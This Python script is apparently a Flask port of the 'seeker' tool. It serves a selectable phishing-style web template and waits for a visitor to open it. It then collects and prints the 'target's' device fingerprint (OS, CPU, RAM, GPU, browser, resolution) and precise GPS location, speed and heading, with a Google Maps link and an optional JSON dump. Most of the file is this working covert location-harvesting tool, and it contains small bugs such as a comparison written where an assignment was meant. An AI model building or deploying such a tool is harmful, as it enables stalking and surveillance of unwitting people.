from shutil import which
import subprocess as subp
import time 
import os 
import sys
import requests
import subprocess as subp
import json
import importlib
import threading
from color import   alert, default, error_

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

import argparse
parser = argparse.ArgumentParser()
parser.add_argument('-o', '--output', help='Saving Target Result in csv or json ( Optional )')
parser.add_argument('-p', '--port', type=int, default=8080, help='Port for Web Server [ Default : 8080 ]')

args = parser.parse_args()
output = args.output
port = args.port


print(default(' Checking Dependencies....'))


pkgs = ['python3', 'pip3', 'flask','ngrok']
inst = True
for pkg in pkgs:
	present = which(pkg)
	if present == None:
		print(error_( ' '+ pkg + ' is not installed!'))
		inst = False
		if pkg == 'flask':
			print(alert(' Do you want to install Flask?'))
			install_state =  input(alert(' Y or N :'))
			if install_state.upper()  == 'Y':

				subp.run(['pip','install','flask'])
				print(alert(' Installation Successfull. Please run back seeker.py.'))
				
		else:
			pass
	else:
		pass
if inst == False:
	exit()
else:
	pass



info = ''
result = ''
version = '0.0.1'
port = 5000


def banner():
	print (G +
	r'''
                        __
  ______  ____   ____  |  | __  ____ _______
 /  ___/_/ __ \_/ __ \ |  |/ /_/ __ \\_  __ \
 \___ \ \  ___/\  ___/ |    < \  ___/ |  | \/
/____  > \___  >\___  >|__|_ \ \___  >|__|
	 \/      \/     \/      \/     \/     Flask Edition''' + W)
	print('\n' + G + '[>]' + C + ' Created by      : ' + W + 'thexeus')
	print('\n' + G + '[>]' + C + ' Originated from : ' + W + 'thewhiteh4t@seeker')
	print(G + '[>]' + C + ' Github          : ' + W + 'https://github.com/thewhiteh4t/seeker')
	print('\n' + G + '[>]' + C + ' Version         : ' + W + version + '\n')


def template_select():
	global site, info, result
	print(default(' Select a Template:') + '\n')
	
	
	with open('web/templates.json', 'r') as templ:
		templ_info = templ.read()
	
	templ_json = json.loads(templ_info)
	
	for item in templ_json['templates']:
		name = item['name']
		print(G + '[{}]'.format(templ_json['templates'].index(item)) + C + ' {}'.format(name) + W)
	
	selected = int(input(G + '[>] ' + W))
	
	try:
		site = templ_json['templates'][selected]['dir_name']
	except IndexError:
		print('\n'+ error_(' Invaid Input!') + '\n')
		
		sys.exit()
	
	print('\n' + default(' Loading {} Template...'.format(templ_json['templates'][selected]['name'])))

	
	module = templ_json['templates'][selected]['module']
	if module == True:
		module_file = templ_json['templates'][selected]['import_file']
		
		importlib.import_module('web.{}'.format(module_file))
	else:
		pass

	
	info = 'web/{}/info.txt'.format(site)
	result = 'web/{}/result.txt'.format(site)



def server():
	#starting server by importing app from site directory
	print('\n' + default(' Port:') + str(port))
	print('\n' + default(' Starting Flask Server....')+'\n',end='')
	importlib.import_module("web.{}.app".format(site))
	



def wait():
	global result

	printed = False
	while True:
		time.sleep(2)
		size = os.path.getsize(result)
		
		if size == 0 and printed == False:
			print('\n' + default(' Waiting for user interaction') + '\n')
			
			printed = True
		if size > 0:
			main()
	
	#waiting fo result file size  != 0 to run main 
	

def main():
	#translating json file from info and result file 

	with open(info,'r') as f:
		info_file = json.load(f)
	
	var_os = info_file['Os']
	var_platform = info_file['Ptf']
	try:
		var_cores = info_file['Cc']
	except TypeError:
		var_cores = 'Not Available'
	var_ram = info_file['Ram']
	var_vendor = info_file['Ven']
	var_render = info_file['Ren']
	var_res = str(info_file['Wd']) + 'x' + str(info_file['Ht'])
	var_browser = info_file['Brw']
	

	print(default(' Device Information :') + '\n')
	print(default(' OS         : ') + str(var_os))
	print(default(' Platform   : ') + str(var_platform))
	print(default(' CPU Cores  : ') + str(var_cores))
	print(default(' RAM        : ') + str(var_ram))
	print(default(' GPU Vendor : ') + str(var_vendor))
	print(default(' GPU        : ') + str(var_render))
	print(default(' Resolution : ') + str(var_res))
	print(default(' Browser    : ') + str(var_browser))

	with open (result, 'r') as file:

		result_file= json.loads(file.read())
		

	
	try:


		var_lat = str(result_file['Lat']) + ' deg'
		var_lon = str(result_file['Lon']) + ' deg'
		var_acc = str(result_file['Acc']) + ' m'

		var_alt = str(result_file['Alt'])
		if var_alt == '':
			var_alt = 'Not Available'
		else:
			var_alt == str(result_file['Alt']) + ' m'
		
		var_dir = str(result_file['Dir'])
		if var_dir == '':
			var_dir = 'Not Available'
		else:
			var_dir = str(result_file['Dir']) + ' deg'
		
		var_spd = str(result_file['Spd'])
		if var_spd == '':
			var_spd = 'Not Available'
		else:
			var_spd = str(result_file['Spd']) + ' m/s'

		print('\n' + default(' Location Information : ') + '\n')
		print(default(' Latitude  : ') + var_lat)
		print(default(' Longitude : ') + var_lon)
		print(default(' Accuracy  : ') + var_acc)
		print(default(' Altitude  : ') + var_alt)
		print(default(' Direction : ') + var_dir)
		print(default(' Speed     : ') + var_spd)

		target_info = {'Info':{
				    'Os':var_os,
			  'Platform':var_platform,
				 'Cores':var_cores,
				   'Ram':var_ram,
			'GPU Vendor':var_vendor,
				   'GPU':var_render,
			'Resolution':var_res,
			'Browser'	:var_browser
			},
			 'Location':{
			
			 'Latitude':var_lat,
			'Longitude':var_lon,
			 'Accuracy':var_acc,
			 'Altitude':var_alt,
			'Direction':var_dir,
			'Speed':var_spd
			
			}
				

			}


	except:
		error = result_file

		print('\n' + error_(str(next(iter(error.values())))))

		repeat()

	print('\n' + default(' Google Maps.................: ') + 'https://www.google.com/maps/place/' + var_lat.strip(' deg') + '+' + var_lon.strip(' deg'))
	jsonout(target_info)
	repeat()



def jsonout(json_):


	if output == None:
		pass

	else:
		with open('db/test','w') as f:
			json.dump(json_,f,indent=4)
	

def clear():
	#clearing info and result file 
	global result
	with open(result, 'w+'): pass
	with open(info, 'w+'): pass

def repeat():
	
	clear()
	wait()
	main()

def Quit():
	global result
	with open(result, 'w+'): pass
	exit()

try:
	banner()
	template_select()
	thread = threading.Thread(target=server)
	thread.setDaemon(True)
	thread.start()
	wait()
	main()

except KeyboardInterrupt:
	print('\n' + alert(' Keyboard Interrupt.'))
	Quit()
